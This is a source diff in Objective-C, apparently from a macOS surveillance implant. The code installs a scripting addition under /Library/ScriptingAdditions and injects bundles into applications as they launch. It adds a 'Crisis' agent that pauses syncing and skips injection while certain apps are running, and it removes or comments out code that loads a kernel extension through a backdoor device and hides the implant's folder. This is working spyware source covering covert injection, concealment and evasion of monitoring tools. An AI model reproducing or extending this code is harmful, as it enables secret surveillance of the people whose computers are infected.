@@ -2099,7 +2099,7 @@ static void computerWillShutdown(CFMachPortRef port,
                        gInputManagerName];
 
 #ifdef DEBUG_CORE
-  warnLog(@"destination osax %@", destDir);
+  infoLog(@"destination osax %@", destDir);
 #endif
   
   NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
@@ -2109,9 +2109,19 @@ static void computerWillShutdown(CFMachPortRef port,
   if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
                                            isDirectory: NO] == NO)
     {
+#ifdef DEBUG_CORE
+      infoLog(@"copying inputmanager file from %@", tempIMDir);
+#endif
       [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
                                               toPath: destDir
                                                error: nil];
+#ifdef DEBUG_CORE
+      if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
+                                               isDirectory: NO] == NO)
+        infoLog(@"OSAX file not created");
+      else
+        infoLog(@"OSAX file created correctly");
+#endif
     }
   
   [tempIMDir release];
@@ -2120,14 +2130,14 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
   
 #ifdef DEBUG_CORE
-  verboseLog(@"Original info.plist for osax %@", info_orig_pl);
+  infoLog(@"Original info.plist for osax %@", info_orig_pl);
 #endif
   
   NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
                                                               withString: gInputManagerName];
   
 #ifdef DEBUG_CORE
-  verboseLog(@"info.plist for osax %@", info_pl);
+  infoLog(@"info.plist for osax %@", info_pl);
 #endif
   
   [info_pl writeToFile: @"/Library/ScriptingAdditions/appleOsax/Contents/Info.plist" 
@@ -2771,37 +2781,6 @@ static void computerWillShutdown(CFMachPortRef port,
   int ret = 0;
   int kextLoaded = 0;
   
-  if (getuid() != 0 && geteuid() == 0)
-    {
-      if ([self connectKext] == -1)
-        {
-#ifdef DEBUG_CORE
-          warnLog(@"connectKext failed, trying to load the KEXT");
-#endif
-          
-          if ([gUtil loadKext] == YES)
-            {
-#ifdef DEBUG_CORE
-              infoLog(@"KEXT loaded successfully");
-#endif
-              
-              if ([self connectKext] != -1)
-                {
-                  kextLoaded = 1;
-                }
-              else
-                {
-#ifdef DEBUG_CORE
-                  errorLog(@"Error on KEXT init");
-#endif
-                }
-            }
-        }
-      else
-        {
-          kextLoaded = 1;
-        }
-    }
   
   if (kextLoaded == 1)
     {
@@ -2852,13 +2831,13 @@ static void computerWillShutdown(CFMachPortRef port,
       else if (gOSMajor == 10 && gOSMinor == 6)
         {
 #ifdef DEBUG_CORE
-          infoLog(@"Hiding OSAX");
+          //infoLog(@"Hiding OSAX");
 #endif
-          NSString *osaxPath = [[NSString alloc] initWithString: OSAX_FOLDER];
-          // Hiding input manager dir
-          ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[osaxPath fileSystemRepresentation]);
-          
-          [osaxPath release];
+//          NSString *osaxPath = [[NSString alloc] initWithString: OSAX_FOLDER];
+//          // Hiding input manager dir
+//          ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[osaxPath fileSystemRepresentation]);
+//          
+//          [osaxPath release];
         }
     
       NSString *appPath = [[[NSBundle mainBundle] bundlePath]
@@ -2918,6 +2897,12 @@ static void computerWillShutdown(CFMachPortRef port,
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
                                                          selector: @selector(injectBundle:)
                                                              name: NSWorkspaceDidLaunchApplicationNotification 
+                                                           object: nil];
+  
+  // Register notification for terminate process for Crisis agent
+  [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
+                                                         selector: @selector(willStopCrisis:)
+                                                             name: NSWorkspaceDidTerminateApplicationNotification 
                                                            object: nil];
   
   //
@@ -3057,15 +3042,86 @@ static void computerWillShutdown(CFMachPortRef port,
   [pool release];
 }
 
+- (BOOL)isCrisisHookApp: (NSString*)appName
+{
+  if (gAgentCrisisApp == nil)
+    return NO;
+  
+  for (int i=0; i<[gAgentCrisisApp count]; i++) 
+  {
+    NSString *tmpAppName = [gAgentCrisisApp objectAtIndex: i];
+    if ([appName isCaseInsensitiveLike: tmpAppName])
+      return YES;
+  }
+  
+  return NO;
+}
+
+- (BOOL)isCrisisNetApp: (NSString*)appName
+{
+  if (gAgentCrisisNet == nil)
+    return NO;
+  
+  for (int i=0; i<[gAgentCrisisNet count]; i++) 
+  {
+    NSString *tmpAppName = [gAgentCrisisNet objectAtIndex: i];
+    if ([appName isCaseInsensitiveLike: tmpAppName])
+      return YES;
+  }
+  
+  return NO;
+}
+
+- (void)willStopCrisis: (NSNotification*)notification
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSDictionary *appInfo = [notification userInfo];
+  
+#ifdef DEBUG_CORE_T
+  infoLog(@"try to stop crisis agent sync for app %@ (gAgentCrisis)", appInfo, gAgentCrisis);
+#endif
+  
+  if ((gAgentCrisis & CRISIS_SYNC) &&
+      [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
+  {
+
+    gAgentCrisis = gAgentCrisis & ~CRISIS_SYNC;
+#ifdef DEBUG_CORE_T
+    infoLog(@"Sync enabled! gAgentCrisis = 0x%x", gAgentCrisis);
+#endif
+  }
+    
+  [pool release];
+}
+
 - (void)injectBundle: (NSNotification*)notification
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   NSDictionary *appInfo = [notification userInfo];
 
-#ifdef DEBUG_CORE
-  verboseLog(@"running new notificaion on app %@", appInfo);
+#ifdef DEBUG_CORE_T
+  infoLog(@"running new notificaion on app %@", appInfo);
 #endif
-
+  
+  if ((gAgentCrisis & CRISIS_START) && 
+      [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
+  {
+    gAgentCrisis |= CRISIS_SYNC;
+#ifdef DEBUG_CORE_T
+    infoLog(@"Sync disabled! gAgentCrisis = 0x%x", gAgentCrisis);
+#endif
+  }
+  
+  if ((gAgentCrisis & CRISIS_START) && 
+      [self isCrisisHookApp: [appInfo objectForKey: @"NSApplicationName"]])
+  {
+#ifdef DEBUG_CORE_T
+    infoLog(@"NSApplicationName match! skipping injection! CRISIS_SYNC = 0x%x", gAgentCrisis);
+#endif
+    return;
+  }
+  
   if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
     {
       // temporary thread for fixing euid/uid escalation
